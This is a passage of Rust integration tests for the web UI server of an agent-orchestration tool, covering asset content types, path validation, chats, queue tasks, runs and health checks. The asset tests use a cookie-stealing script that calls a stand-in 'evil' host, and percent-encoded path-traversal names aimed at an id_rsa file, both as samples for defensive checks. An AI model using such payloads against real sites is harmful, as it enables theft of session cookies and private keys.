        assert_eq!(as_svg.header("content-disposition"), Some("attachment"));

        assert_eq!(as_png.status, 200);
        assert_eq!(as_png.header("content-type"), Some("image/png"));
        assert_eq!(
            as_png.header("content-disposition"),
            None,
            "a raster image has no execution surface, so tapping it still shows it"
        );
        assert_eq!(as_png.bytes, png, "a binary asset survives the round trip");
    }

    #[tokio::test]
    async fn an_html_asset_is_never_served_as_html() {
        let fx = Fixture::start().await;
        let id = panel(
            &fx,
            "<p>see the notes</p>",
            &[
                (
                    "notes.html",
                    b"<script>fetch('http://evil/'+document.cookie)</script>",
                ),
                ("hook.js", b"fetch('http://evil/')"),
                ("data.json", b"{}"),
                ("HEADLINE.TXT", b"plain"),
            ],
        );

        for name in ["notes.html", "hook.js", "data.json"] {
            let res = fx.get(&format!("/api/questions/{id}/asset/{name}")).await;
            assert_eq!(res.status, 200, "{name}: {}", res.body);
            // Serving this as text/html would be a way to reach agent markup
            // at the top level of the operator's browser, outside the frame's
            // sandbox and outside its CSP - which is the whole thing the panel
            // design exists to prevent. Unlisted types are downloads.
            assert_eq!(
                res.header("content-type"),
                Some("application/octet-stream"),
                "{name} must not be a type the browser will execute or render"
            );
        }
        // The whitelist is matched case-insensitively, so an agent shouting the
        // extension still gets a readable file rather than a download.
        let txt = fx
            .get(&format!("/api/questions/{id}/asset/HEADLINE.TXT"))
            .await;
        assert_eq!(
            txt.header("content-type"),
            Some("text/plain; charset=utf-8")
        );
    }

    #[tokio::test]
    async fn no_spelling_of_a_traversing_asset_name_reaches_the_filesystem() {
        let fx = Fixture::start().await;
        let id = panel(&fx, "<p>x</p>", &[("diff.svg", b"<svg/>")]);
        // Something outside the panel directory that a traversal would reach if
        // one got through, so a passing test is not merely "the file was
        // missing anyway".
        std::fs::write(fx.questions().root().join("id_rsa"), b"secret").expect("write the bait");

        // Decoded before this server's handler sees them: axum percent-decodes
        // path parameters, so `name` arrives as `../id_rsa`, `..\id_rsa` and a
        // string with a NUL in it. All three look like ordinary single-segment
        // filenames to the router, so the router passes them through and
        // `valid_asset_name` is what refuses them - for the literal `..`, and
        // for `/`, `\` and NUL not being in the permitted character set.
        for encoded in [
            "%2e%2e%2fid_rsa",
            "..%2fid_rsa",
            "..%5cid_rsa",
            "%2e%2e%5cid_rsa",
            "diff%00.svg",
            "..",
            ".hidden",
            "%2e%2e%2f%2e%2e%2fid_rsa",
        ] {
            let res = fx
                .get(&format!("/api/questions/{id}/asset/{encoded}"))
                .await;
            assert_eq!(
                res.status, 400,
                "`{encoded}` has to be refused by name, not looked up: {}",
                res.body
            );
            assert!(res.json()["error"].is_string(), "{}", res.body);
        }

        // Not decoded, and never this handler's problem: a real slash makes the
        // request one segment too long for `/api/questions/{id}/asset/{name}`,
        // so axum's router has no route to match and answers before any code
        // here runs. Asserted so that a future route with a wildcard segment
        // cannot quietly open this door.
        for literal in ["../id_rsa", "../../questions/id_rsa", "..%5c../id_rsa"] {
            let res = fx
                .get(&format!("/api/questions/{id}/asset/{literal}"))
                .await;
            assert_eq!(
                res.status, 404,
                "`{literal}` must not match the asset route at all: {}",
                res.body
            );
        }
    }

    #[tokio::test]
    async fn a_missing_panel_and_an_unknown_asset_are_both_json_404s() {
        let fx = Fixture::start().await;
        let plain = ask(&fx, "Which backend?", &["SQLite"]);
        let with_panel = panel(&fx, "<p>x</p>", &[("diff.svg", b"<svg/>")]);

        // A question nobody wrote a panel for. The client preflights with HEAD
        // and cannot see inside a sandboxed frame, so this must be a status and
        // not an empty page.
        let none = fx.get(&format!("/api/questions/{plain}/panel")).await;
        assert_eq!(none.status, 404, "{}", none.body);
        assert!(none.json()["error"].is_string(), "{}", none.body);
        assert_eq!(
            fx.head(&format!("/api/questions/{plain}/panel"))
                .await
                .status,
            404,
            "the preflight is the only way the client can learn this"
        );

        // A name that is perfectly legal and simply is not there.
        let missing = fx
            .get(&format!("/api/questions/{with_panel}/asset/absent.png"))
            .await;
        assert_eq!(missing.status, 404, "{}", missing.body);
        assert!(missing.json()["error"].is_string(), "{}", missing.body);

        // A question that does not exist at all, on both routes.
        assert_eq!(fx.get("/api/questions/nope/panel").await.status, 404);
        assert_eq!(
            fx.get("/api/questions/nope/asset/diff.svg").await.status,
            404
        );
    }

    #[tokio::test]
    async fn the_chat_list_is_open_first_and_carries_the_whole_transcript() {
        let fx = Fixture::start().await;
        assert_eq!(fx.get("/api/health").await.json()["chats_open"], 0);

        interview(&fx, "20260903-014455-old1", "filed", Some(&good_draft()));
        interview(&fx, "20260903-014456-open", "open", None);

        let listed = fx.get("/api/chats").await;
        assert_eq!(listed.status, 200, "{}", listed.body);
        let chats = listed.json();
        assert_eq!(chats.as_array().map(Vec::len), Some(2));
        assert_eq!(
            chats[0]["id"], "20260903-014456-open",
            "an unfinished interview is what the operator came back for: {chats}"
        );
        assert_eq!(chats[0]["status"], "open");
        // The transcript is the only thing a chat is made of, so the list
        // carries it rather than making the phone fetch each one.
        assert_eq!(chats[0]["turns"][0]["who"], "operator");
        assert_eq!(chats[0]["turns"][1]["body"], "Which part is hurting?");
        assert_eq!(chats[1]["status"], "filed");

        // The one number that says "you left an interview open"; a filed one
        // has become a task and must not keep counting.
        assert_eq!(fx.get("/api/health").await.json()["chats_open"], 1);
    }

    #[tokio::test]
    async fn one_interview_is_readable_by_short_id_and_an_unknown_one_is_a_404() {
        let fx = Fixture::start().await;
        let id = interview(&fx, "20260903-014455-ab12", "open", None);

        let full = fx.get(&format!("/api/chats/{id}")).await;
        assert_eq!(full.status, 200, "{}", full.body);
        assert_eq!(full.json()["id"], id);
        assert_eq!(full.json()["repo"], "/repo/magi");

        // The short id is what the operator reads off a notification.
        let short = fx.get("/api/chats/ab12").await;
        assert_eq!(short.status, 200, "{}", short.body);
        assert_eq!(short.json()["id"], id);

        let missing = fx.get("/api/chats/nosuchchat").await;
        assert_eq!(missing.status, 404, "{}", missing.body);
        assert!(
            missing.json()["error"]
                .as_str()
                .is_some_and(|e| e.contains("chat")),
            "the error names what was not found: {}",
            missing.body
        );
    }

    #[tokio::test]
    async fn filing_a_bad_draft_reports_every_problem_at_once() {
        let fx = Fixture::start().await;
        let id = interview(&fx, "20260903-014455-ab12", "open", Some("do the thing"));

        let res = fx.post(&format!("/api/chats/{id}/file"), None).await;

        assert_eq!(res.status, 400, "{}", res.body);
        let problems = res.json()["problems"].clone();
        let problems = problems.as_array().expect("an array of problems");
        // Every problem, not the first one. The operator is on a phone: a
        // draft with no title and no acceptance criteria is one edit, and
        // reporting it one problem per round trip means asking the interviewer
        // to rewrite it twice.
        assert!(
            problems.len() > 1,
            "one round trip has to be enough to fix the draft: {}",
            res.body
        );
        assert!(problems.iter().all(|p| p.is_string()), "{}", res.body);
        assert!(res.json()["error"].is_string(), "{}", res.body);
        assert!(
            fx.queue().list().is_empty(),
            "a refused draft must not reach the queue"
        );

        // An interview the agent has not drafted for at all is the same shape,
        // so the front end has one path rather than two.
        let empty = interview(&fx, "20260903-014456-cd34", "open", None);
        let res = fx.post(&format!("/api/chats/{empty}/file"), None).await;
        assert_eq!(res.status, 400, "{}", res.body);
        assert_eq!(
            res.json()["problems"].as_array().map(Vec::len),
            Some(1),
            "{}",
            res.body
        );
    }

    #[tokio::test]
    async fn filing_a_good_draft_queues_it_and_answers_with_the_task_id() {
        let fx = Fixture::start().await;
        let draft = good_draft();
        let id = interview(&fx, "20260903-014455-ab12", "open", Some(&draft));

        let res = fx.post(&format!("/api/chats/{id}/file"), None).await;

        assert_eq!(res.status, 200, "{}", res.body);
        let task = res.json()["task"]
            .as_str()
            .unwrap_or_else(|| panic!("a task id: {}", res.body))
            .to_owned();

        // The point of the whole browser interview: a real task in the real
        // queue, indistinguishable from one filed at a terminal.
        let queued = fx.queue().get(&task).expect("the task is on disk");
        assert_eq!(
            queued.instruction, draft,
            "the draft reaches the graph verbatim"
        );
        assert_eq!(queued.repo, PathBuf::from("/repo/magi"));
        assert_eq!(
            fx.get("/api/queue").await.json()[0]["id"],
            task,
            "the filed task is the listed one"
        );

        // The interview is finished, so it stops asking to be finished.
        let after = fx.get(&format!("/api/chats/{id}")).await.json();
        assert_eq!(after["task"], task);
        assert_eq!(after["status"], "filed");
        assert_eq!(fx.get("/api/health").await.json()["chats_open"], 0);
    }

    #[tokio::test]
    async fn a_second_turn_on_a_busy_chat_is_refused_rather_than_interleaved() {
        let fx = Fixture::start().await;
        let id = interview(&fx, "20260903-014455-ab12", "open", None);
        let ui = Ui::new(
            fx.queue(),
            fx.questions(),
            fx.chats(),
            fx.runs(),
            fx.home.path().to_path_buf(),
            PathBuf::from("/repo/magi"),
        );

        // The claim a running `POST /say` holds. Taken directly rather than by
        // starting a turn, because a turn spawns an agent CLI and no test here
        // is allowed to do that.
        let first = ui.begin_turn(&id).expect("the first turn claims the chat");
        let second = ui.begin_turn(&id).expect_err("the second must be refused");
        assert_eq!(
            second.status,
            StatusCode::CONFLICT,
            "a double tap on a slow link must not append two half-turns"
        );

        // Dropped rather than released by hand, which is what makes a cancelled
        // request - a phone that walked out of range mid-turn - leave the chat
        // usable instead of wedged until the server restarts.
        drop(first);
        assert!(
            ui.begin_turn(&id).is_ok(),
            "the slot has to come back on its own"
        );
    }

    #[tokio::test]
    async fn a_turn_with_nothing_in_it_never_reaches_an_agent() {
        let fx = Fixture::start().await;
        let id = interview(&fx, "20260903-014455-ab12", "open", None);

        // Refused on the request, before the chat is even resolved, so an
        // accidental send costs neither a model call nor a turn in the record.
        for body in [r#"{"text":"   \n "}"#, r#"{}"#] {
            let res = fx.post(&format!("/api/chats/{id}/say"), Some(body)).await;
            assert_eq!(res.status, 400, "{body}: {}", res.body);
        }
        let res = fx.post("/api/chats", Some(r#"{"idea":"  "}"#)).await;
        assert_eq!(res.status, 400, "{}", res.body);

        assert_eq!(
            fx.get(&format!("/api/chats/{id}")).await.json()["turns"]
                .as_array()
                .map(Vec::len),
            Some(2),
            "nothing above may have appended a turn"
        );
    }

    #[tokio::test]
    async fn a_run_with_an_open_question_reads_as_waiting() {
        let fx = Fixture::start().await;
        let run = "20260902-000000-beef".to_owned();
        write_run(&fx.runs(), &run, RunStatus::Implementing);

        let before = fx.get("/api/runs").await.json();
        assert_eq!(before[0]["waiting"], false, "{before}");

        let store = fx.questions();
        let mut q = Question::new(
            run.clone(),
            "implement".to_owned(),
            "impl-A".to_owned(),
            "Which backend?".to_owned(),
            String::new(),
            vec!["SQLite".to_owned()],
        );
        store.put(&mut q).expect("put");

        let during = fx.get("/api/runs").await.json();
        assert_eq!(during[0]["waiting"], true, "{during}");

        // Answered: the run is moving again, and the flag has to follow without
        // anything having rewritten run.json.
        q.answer(Answer::Choice("SQLite".to_owned()))
            .expect("answer");
        store.put(&mut q).expect("put");
        let after = fx.get("/api/runs").await.json();
        assert_eq!(after[0]["waiting"], false, "{after}");
    }

    #[tokio::test]
    async fn an_open_question_is_listed_and_counted_by_health() {
        let fx = Fixture::start().await;
        assert_eq!(fx.get("/api/health").await.json()["questions_open"], 0);

        let id = ask(&fx, "Which backend?", &["SQLite", "Redis"]);
        let listed = fx.get("/api/questions").await.json();
        assert_eq!(listed.as_array().expect("array").len(), 1);
        assert_eq!(listed[0]["id"], id);
        assert_eq!(listed[0]["status"], "open");
        assert_eq!(listed[0]["choices"][1], "Redis");
        // The count is what makes the phone's indicator honest: it is the one
        // number meaning nothing will move until a human acts.
        assert_eq!(fx.get("/api/health").await.json()["questions_open"], 1);
    }

    #[tokio::test]
    async fn answering_records_the_choice_and_a_second_answer_conflicts() {
        let fx = Fixture::start().await;
        let id = ask(&fx, "Which backend?", &["SQLite", "Redis"]);
        let path = format!("/api/questions/{id}/answer");

        let res = fx.post(&path, Some(r#"{"choice":"Redis"}"#)).await;
        assert_eq!(res.status, 200, "{}", res.body);
        let body = res.json();
        assert_eq!(body["status"], "answered");
        assert_eq!(body["answer"]["choice"], "Redis");

        // Answered from the terminal in between the list and the tap: the UI
        // must be able to tell this from a bad request, so it can show the
        // recorded answer instead of an error.
        let again = fx.post(&path, Some(r#"{"choice":"SQLite"}"#)).await;
        assert_eq!(again.status, 409, "{}", again.body);
        assert_eq!(fx.get("/api/health").await.json()["questions_open"], 0);
    }

    #[tokio::test]
    async fn an_answer_the_question_does_not_offer_is_refused() {
        let fx = Fixture::start().await;
        let id = ask(&fx, "Which backend?", &["SQLite", "Redis"]);
        let path = format!("/api/questions/{id}/answer");

        for body in [
            r#"{"choice":"Postgres"}"#,
            r#"{"text":"whatever you think"}"#,
            r#"{"choice":"Redis","text":"both"}"#,
            r#"{}"#,
        ] {
            let res = fx.post(&path, Some(body)).await;
            assert_eq!(res.status, 400, "{body} should be refused: {}", res.body);
            assert!(res.json()["error"].is_string(), "{}", res.body);
        }
        // Nothing above may have answered it.
        assert_eq!(fx.get("/api/health").await.json()["questions_open"], 1);
    }

    #[tokio::test]
    async fn a_free_text_question_takes_text_and_not_a_choice() {
        let fx = Fixture::start().await;
        let id = ask(&fx, "What should the flag be called?", &[]);
        let path = format!("/api/questions/{id}/answer");

        assert_eq!(
            fx.post(&path, Some(r#"{"choice":"--json"}"#)).await.status,
            400
        );
        let res = fx.post(&path, Some(r#"{"text":"--json"}"#)).await;
        assert_eq!(res.status, 200, "{}", res.body);
        assert_eq!(res.json()["answer"]["text"], "--json");
    }

    #[tokio::test]
    async fn an_unknown_question_is_a_json_404() {
        let fx = Fixture::start().await;
        let res = fx
            .post("/api/questions/nope/answer", Some(r#"{"text":"x"}"#))
            .await;
        assert_eq!(res.status, 404, "{}", res.body);
        assert!(res.json()["error"].is_string());
    }

    #[tokio::test]
    async fn a_blank_instruction_is_rejected_and_files_nothing() {
        let f = Fixture::start().await;

        let res = f
            .post("/api/queue", Some(r#"{"instruction":"   \n  "}"#))
            .await;

        assert_eq!(res.status, 400);
        assert!(
            res.json()["error"].as_str().is_some_and(|e| !e.is_empty()),
            "a rejection has to say why: {}",
            res.body
        );
        assert!(
            f.queue().list().is_empty(),
            "a rejected task must not reach the disk"
        );
    }

    #[tokio::test]
    async fn a_malformed_body_is_a_bad_request_not_an_unprocessable_entity() {
        let f = Fixture::start().await;

        let res = f.post("/api/queue", Some("{not json")).await;

        // The UI branches on 400; axum's default for a bad body is 422, which
        // it would report as an unknown failure.
        assert_eq!(res.status, 400);
    }

    #[tokio::test]
    async fn a_posted_task_is_queued_with_a_title_taken_from_its_instruction() {
        let f = Fixture::start().await;

        let created = f
            .post(
                "/api/queue",
                Some(
                    r##"{"instruction":"# Rework the config loader\n\nIt re-reads the file on every lookup"}"##,
                ),
            )
            .await;
        assert_eq!(created.status, 201);

        let listed = f.get("/api/queue").await;
        let tasks = listed.json();
        let task = &tasks[0];

        assert_eq!(tasks.as_array().map(Vec::len), Some(1));
        // The title the server derives is the summary the author already
        // wrote, without its marker.
        assert_eq!(task["title"], "Rework the config loader");
        assert_eq!(task["source_label"], "human");
        assert_eq!(task["status_str"], "queued");
        assert_eq!(task["repo"], "/repo/magi", "the server's default repo");
        assert_eq!(
            task["id"],
            created.json()["id"],
            "the posted task is the listed one"
        );
        assert!(
            task["instruction"]
                .as_str()
                .is_some_and(|i| i.starts_with("# Rework the config loader\n\nIt re-reads")),
            "the instruction reaches the graph verbatim, markers and all: {}",
            task["instruction"]
        );
    }

    #[tokio::test]
    async fn holding_then_releasing_returns_a_task_to_the_loop_with_a_fresh_budget() {
        let f = Fixture::start().await;
        let queue = f.queue();
        let mut task = Task::new(
            "spent".to_owned(),
            "Try again".to_owned(),
            PathBuf::from("/repo/magi"),
            Source::Human,
        );
        task.start("20260902-140502-bbbb".to_owned());
        task.fail("agent gave up", 9);
        queue.put(&mut task).expect("file the task");

        let held = f.post(&format!("/api/queue/{}/hold", task.id), None).await;
        assert_eq!(held.status, 200);
        assert_eq!(held.json()["status_str"], "held");

        let released = f
            .post(&format!("/api/queue/{}/release", task.id), None)
            .await;
        assert_eq!(released.status, 200);
        assert_eq!(released.json()["status_str"], "queued");
        assert_eq!(
            released.json()["attempts"],
            0,
            "release is a real second chance, not an instant re-hold"
        );
        assert_eq!(
            queue.get(&task.id).expect("reload").status,
            TaskStatus::Queued,
            "the change is on disk, not only in the reply"
        );
        assert!(
            !f.home
                .path()
                .join("queue")
                .join(format!("{}.lock", task.id))
                .exists(),
            "the claim the mutation took is released again"
        );
    }

    #[tokio::test]
    async fn a_task_a_daemon_is_running_cannot_be_changed_from_the_phone() {
        let f = Fixture::start().await;
        let queue = f.queue();
        let mut task = Task::new(
            "busy".to_owned(),
            "Running right now".to_owned(),
            PathBuf::from("/repo/magi"),
            Source::Human,
        );
        queue.put(&mut task).expect("file the task");
        let _claim = queue.claim(&task.id).expect("stand in for the daemon");

        let res = f.post(&format!("/api/queue/{}/hold", task.id), None).await;

        assert_eq!(res.status, 409);
        assert_eq!(
            queue.get(&task.id).expect("reload").status,
            TaskStatus::Queued,
            "the refused hold changed nothing"
        );
    }

    #[tokio::test]
    async fn unknown_ids_are_json_not_found_on_both_stores() {
        let f = Fixture::start().await;

        let run = f.get("/api/runs/nosuchrun").await;
        let task = f.post("/api/queue/nosuchtask/hold", None).await;

        assert_eq!(run.status, 404);
        assert_eq!(task.status, 404);
        assert!(
            run.json()["error"]
                .as_str()
                .is_some_and(|e| e.contains("run")),
            "the error names what was not found: {}",
            run.body
        );
        assert!(
            task.json()["error"]
                .as_str()
                .is_some_and(|e| e.contains("task")),
            "the error names what was not found: {}",
            task.body
        );
    }

    #[tokio::test]
    async fn the_daemon_counts_as_running_only_while_its_heartbeat_is_fresh() {
        let f = Fixture::start().await;

        let missing = f.get("/api/health").await.json();
        assert_eq!(missing["daemon"]["running"], false, "no file, no daemon");

        write_daemon(
            f.home.path(),
            Timestamp::now() - jiff::SignedDuration::from_secs(60),
        );
        let stale = f.get("/api/health").await.json();
        assert_eq!(
            stale["daemon"]["running"], false,
            "a minute without a heartbeat is a dead daemon, not a busy one"
        );
        assert!(
            stale["daemon"]["stale_for_secs"]
                .as_i64()
                .is_some_and(|s| s >= 55),
            "staleness is reported so the UI can say how long: {stale}"
        );

        write_daemon(f.home.path(), Timestamp::now());
        let fresh = f.get("/api/health").await.json();
        assert_eq!(fresh["daemon"]["running"], true);
        assert_eq!(fresh["daemon"]["idle"], false);
        assert_eq!(fresh["daemon"]["pid"], 4242);
        assert_eq!(fresh["daemon"]["completed"], 7);
        assert_eq!(fresh["daemon"]["current"]["task"], "20260902-140501-aaaa");
        assert_eq!(fresh["version"], env!("CARGO_PKG_VERSION"));
    }

    #[tokio::test]
    async fn a_newer_daemon_status_file_still_renders() {
        let f = Fixture::start().await;
        // A field this build has never heard of must not turn the status line
        // into a 500; that is the whole reason the reader is permissive.
        std::fs::write(
            f.home.path().join("daemon.json"),
            serde_json::json!({
                "schema": 2,
                "updated_at": Timestamp::now().to_string(),
                "idle": true,
                "surprise": { "nested": [1, 2, 3] },
            })
            .to_string(),
        )
        .expect("write daemon.json");

        let health = f.get("/api/health").await;

        assert_eq!(health.status, 200);
        assert_eq!(health.json()["daemon"]["running"], true);
    }

    #[tokio::test]
    async fn a_corrupt_run_is_skipped_in_the_list_and_explained_on_its_own_route() {
        let f = Fixture::start().await;
        write_run(&f.runs(), "20260902-140501-good", RunStatus::Ready);
        let broken = f.runs().join("20260902-140502-bad");
        std::fs::create_dir_all(&broken).expect("run dir");
        std::fs::write(broken.join("run.json"), "{ truncated").expect("write run.json");

        let list = f.get("/api/runs").await;
        let detail = f.get("/api/runs/20260902-140502-bad").await;

        assert_eq!(list.status, 200);
        let listed = list.json();
        let ids: Vec<&str> = listed
            .as_array()
            .expect("an array")
            .iter()
            .map(|r| r["id"].as_str().expect("an id"))
            .collect();
        assert_eq!(
            ids,
            vec!["20260902-140501-good"],
            "one unreadable run must not cost the operator the whole history"
        );
        assert_eq!(detail.status, 500);
        assert!(
            detail.json()["error"]
                .as_str()
                .is_some_and(|e| e.contains("run.json")),
            "the failure names the file to look at: {}",
            detail.body
        );
        // A skipped run has to be countable somewhere, or the UI shows an
        // empty history with nothing to explain it - which is exactly what a
        // directory full of older-schema runs looks like.
        let health = f.get("/api/health").await;
        assert_eq!(health.json()["runs_unreadable"], 1);
    }

    #[tokio::test]
    async fn a_run_is_summarised_for_the_list_and_served_whole_on_its_own_route() {
        let f = Fixture::start().await;
        write_run(&f.runs(), "20260902-140501-a1b2", RunStatus::Ready);

        let summary = f.get("/api/runs").await.json();
        let row = &summary[0];
        assert_eq!(row["short"], "a1b2");
        assert_eq!(row["status"], "ready");
        assert_eq!(row["done"], true);
        assert_eq!(row["title"], "Add a web UI");
        assert_eq!(row["repo_name"], "magi");
        assert_eq!(row["judges"], 3);
        assert_eq!(row["winner"], Value::Null);
        assert_eq!(row["reviews"], 0);

        // The short id resolves, and the detail route is the state itself, not
        // a projection of it: the UI reads fields the summary does not carry.
        let detail = f.get("/api/runs/a1b2").await;
        assert_eq!(detail.status, 200);
        assert_eq!(detail.json()["base_branch"], "main");
        assert_eq!(detail.json()["id"], "20260902-140501-a1b2");
    }

    #[tokio::test]
    async fn the_run_list_is_newest_first_and_honours_a_limit() {
        let f = Fixture::start().await;
        for id in [
            "20260902-140501-aaaa",
            "20260902-140502-bbbb",
            "20260902-140503-cccc",
        ] {
            write_run(&f.runs(), id, RunStatus::Merged);
        }

        let all = f.get("/api/runs").await.json();
        let capped = f.get("/api/runs?limit=2").await.json();

        assert_eq!(all[0]["id"], "20260902-140503-cccc");
        assert_eq!(all.as_array().map(Vec::len), Some(3));
        assert_eq!(capped.as_array().map(Vec::len), Some(2));
        assert_eq!(capped[0]["id"], "20260902-140503-cccc");
    }

    #[tokio::test]
    async fn the_report_route_serves_the_terminal_report_as_plain_text() {
        let f = Fixture::start().await;
        write_run(&f.runs(), "20260902-140501-a1b2", RunStatus::Blocked);

        let res = f.get("/api/runs/20260902-140501-a1b2/report").await;

        assert_eq!(res.status, 200);
        assert!(
            res.headers
                .contains("content-type: text/plain; charset=utf-8"),
            "a browser must render it, not download it: {}",
            res.headers
        );
        // The assertion is on content, not on the absence of escapes: colour
        // is a process-global that `serve` turns off at startup, and another
        // test in this binary may own it while this one runs.
        assert!(
            res.body.contains("20260902-140501-a1b2"),
            "the report is about the run that was asked for: {}",
            res.body
        );
    }

    #[tokio::test]
    async fn the_front_end_is_served_from_the_binary_with_types_a_phone_renders() {
        let f = Fixture::start().await;

        let html = f.get("/").await;
        let css = f.get("/app.css").await;
        let js = f.get("/app.js").await;

        assert_eq!((html.status, css.status, js.status), (200, 200, 200));
        assert!(
            html.headers
                .contains("content-type: text/html; charset=utf-8")
        );
        assert!(css.headers.contains("content-type: text/css"));
        assert!(js.headers.contains("content-type: text/javascript"));
        assert_eq!(html.body, INDEX_HTML, "compiled in, never read from disk");
    }

    #[tokio::test]
    async fn the_change_stream_announces_the_current_revisions_on_connect() {
        let f = Fixture::start().await;

        let mut socket = tokio::net::TcpStream::connect(f.addr)
            .await
            .expect("connect");
        socket
            .write_all(
                b"GET /api/events HTTP/1.1\r\nHost: magi\r\nAccept: text/event-stream\r\n\r\n",
            )
            .await
            .expect("write request");

        // Read until the first event arrives rather than to end of stream: the
        // stream is endless by design, which is the point of the route.
        let mut seen = String::new();
        let mut buf = [0u8; 1024];
        while !seen.contains("event: change") {
            let read = tokio::time::timeout(Duration::from_secs(5), socket.read(&mut buf))
                .await
                .expect("the stream must speak within five seconds")
                .expect("read");
            assert!(read > 0, "the server closed the change stream: {seen}");
            seen.push_str(&String::from_utf8_lossy(&buf[..read]));
        }

        assert!(
            seen.to_lowercase()
                .contains("content-type: text/event-stream"),
            "the browser only reconnects automatically for a real SSE stream: {seen}"
        );
        let data = seen
            .lines()
            .find_map(|l| l.strip_prefix("data:"))
            .expect("a data line");
        let payload: Value = serde_json::from_str(data.trim()).expect("json payload");
        assert!(
            payload["queue_rev"].is_u64()
                && payload["runs_rev"].is_u64()
                && payload["questions_rev"].is_u64()
                && payload["chats_rev"].is_u64(),
            "the client needs one revision per store to know what to refetch, \
             and `chats_rev` is the only notification a slow interview gets - \
             a phone whose radio slept through a turn learns about it here: \
             {payload}"
        );

        // The front end re-polls health on a timer and on wake, and takes the
        // revisions from that answer whenever the stream is not up. So health
        // has to carry every key the stream carries: a phone on a link that
        // will not hold an SSE connection is exactly the phone that must still
        // notice a question, and a missing key there is not a 500 but a UI
        // that quietly stops updating.
        let health = f.get("/api/health").await.json();
        for key in ["queue_rev", "runs_rev", "questions_rev", "chats_rev"] {
            assert!(
                health[key].is_u64(),
                "health is the change stream's fallback and is missing `{key}`: {health}"
            );
        }
    }

    #[test]
    fn bind_reads_back_from_the_spelling_the_cli_prints() {
        // The CLI shows the default in `--help` and parses whatever comes
        // back, so the two directions have to agree or `--bind auto` breaks
        // the moment someone copies the help text.
        for bind in [Bind::Auto, Bind::Addr(IpAddr::V4(Ipv4Addr::LOCALHOST))] {
            assert_eq!(bind.to_string().parse::<Bind>(), Ok(bind));
        }
        assert_eq!("AUTO".parse::<Bind>(), Ok(Bind::Auto));
        assert!("everywhere".parse::<Bind>().is_err());
    }

    #[test]
    fn an_explicit_bind_address_is_taken_verbatim() {
        let asked = IpAddr::V4(Ipv4Addr::new(192, 168, 1, 20));

        let (addr, warning) = resolve_bind(&Bind::Addr(asked));

        assert_eq!(addr, asked);
        assert!(
            warning.is_none(),
            "an operator who named an address gets no lecture"
        );
    }

    #[test]
    fn bind_auto_either_finds_a_tailnet_address_or_says_the_ui_is_local_only() {
        let (addr, warning) = resolve_bind(&Bind::Auto);

        // This has to hold on a CI runner with no `tailscale` and on a dev box
        // with one, so the invariant asserted is the one shared by both
        // outcomes: the address is either a real tailnet address offered
        // without comment, or loopback with an explanation. What must never
        // happen is a silent fallback - an operator told "listening on
        // 127.0.0.1" with no reason would go looking for a firewall.
        match addr {
            IpAddr::V4(ip) if is_tailnet(&ip) => {
                assert!(warning.is_none(), "a tailnet address needs no warning");
            }
            other => {
                assert_eq!(other, IpAddr::V4(Ipv4Addr::LOCALHOST));
                let warning = warning.expect("a fallback has to explain itself");
                assert!(
                    warning.contains("127.0.0.1") && warning.contains("local-only"),
                    "the warning says what happened and what it costs: {warning}"
                );
            }
        }
    }

    #[test]
    fn only_the_cgnat_block_counts_as_a_tailnet_address() {
        // `tailscale ip -4` output is trusted only inside 100.64.0.0/10; the
        // boundary cases are what stop us binding to some other tool's idea of
        // an address.
        assert!(is_tailnet(&Ipv4Addr::new(100, 64, 0, 1)));
        assert!(is_tailnet(&Ipv4Addr::new(100, 127, 255, 254)));
        assert!(!is_tailnet(&Ipv4Addr::new(100, 63, 255, 255)));
        assert!(!is_tailnet(&Ipv4Addr::new(100, 128, 0, 1)));
        assert!(!is_tailnet(&Ipv4Addr::new(127, 0, 0, 1)));
    }

    #[test]
    fn an_ambiguous_prefix_is_a_bad_request_and_a_missing_one_is_not_found() {
        let ids = vec![
            "20260902-140501-aaaa".to_owned(),
            "20260902-140502-aabb".to_owned(),
        ];

        let missing = pick(ids.clone(), "zzzz", "run").expect_err("no match");
        let ambiguous = pick(ids.clone(), "202609", "run").expect_err("two matches");
        let short = pick(ids, "aabb", "run").expect("the short id is the tail of an id");

        assert_eq!(missing.status, StatusCode::NOT_FOUND);
        assert_eq!(ambiguous.status, StatusCode::BAD_REQUEST);
        assert_eq!(short, "20260902-140502-aabb");
    }
    #[tokio::test]
    async fn a_panel_reaches_its_assets_by_the_bare_name_it_was_told_to_use() {
        // The prompt tells agents to reference attachments by bare filename.
        // A document served at `.../panel` resolves `shot.png` against its own
        // directory, i.e. `.../shot.png`, which is not the asset route - so a
        // panel written exactly as instructed showed broken images. Caught by
        // looking at a real one in a browser, not by reading the code.
        let fx = Fixture::start().await;
        let id = panel(
            &fx,
            "<img src=\"shot.png\">",
            &[("shot.png", b"\x89PNG\r\n\x1a\n")],
        );

        // The frame's own URL ends in a filename, so its siblings are reachable.
        let doc = fx
            .get(&format!("/api/questions/{id}/panel/index.html"))
            .await;
        assert_eq!(doc.status, 200, "{}", doc.body);
        assert_eq!(doc.header("content-type"), Some("text/html; charset=utf-8"));

        let sibling = fx.get(&format!("/api/questions/{id}/panel/shot.png")).await;
        assert_eq!(sibling.status, 200, "{}", sibling.body);
        assert_eq!(sibling.header("content-type"), Some("image/png"));
        assert_eq!(
            sibling.header("content-security-policy"),
            Some(PANEL_CSP),
            "the sibling route must carry the same policy as the asset route"
        );

        // The original spelling keeps working: HEAD on it is how the front end
        // decides whether to mount a frame at all.
        assert_eq!(
            fx.head(&format!("/api/questions/{id}/panel")).await.status,
            200
        );
    }

    #[test]
    fn runs_revision_moves_when_deleting_an_older_run() {
        let temp = TempDir::new().expect("tempdir");
        let runs = temp.path().join("runs");
        std::fs::create_dir_all(&runs).expect("create runs dir");

        assert_eq!(runs_revision(&runs), 0, "empty runs has 0 revision");

        write_run(&runs, "20260901-100000-old1", RunStatus::Merged);
        std::thread::sleep(Duration::from_millis(10));
        write_run(&runs, "20260902-100000-new2", RunStatus::Merged);

        let rev_before = runs_revision(&runs);
        assert!(rev_before > 0);

        let old_dir = runs.join("20260901-100000-old1");
        std::fs::remove_dir_all(&old_dir).expect("remove old run");

        let rev_after = runs_revision(&runs);
        assert_ne!(
            rev_before, rev_after,
            "deleting an older run must change the revision so other clients see the deletion"
        );
    }

    #[tokio::test]
    async fn delete_queue_task_deletes_file_and_guards_running_and_locked() {
        let fx = Fixture::start().await;
        let q = fx.queue();

        // 1. A queued task with runs attached can be deleted.
        let mut t1 = Task::new(
            "Task 1".to_owned(),
            "Instruction 1".to_owned(),
            PathBuf::from("/repo"),
            Source::Human,
        );
        let run_id = "20260901-000000-r111";
        t1.runs.push(run_id.to_owned());
        write_run(&fx.runs(), run_id, RunStatus::Merged);
        q.put(&mut t1).expect("put t1");

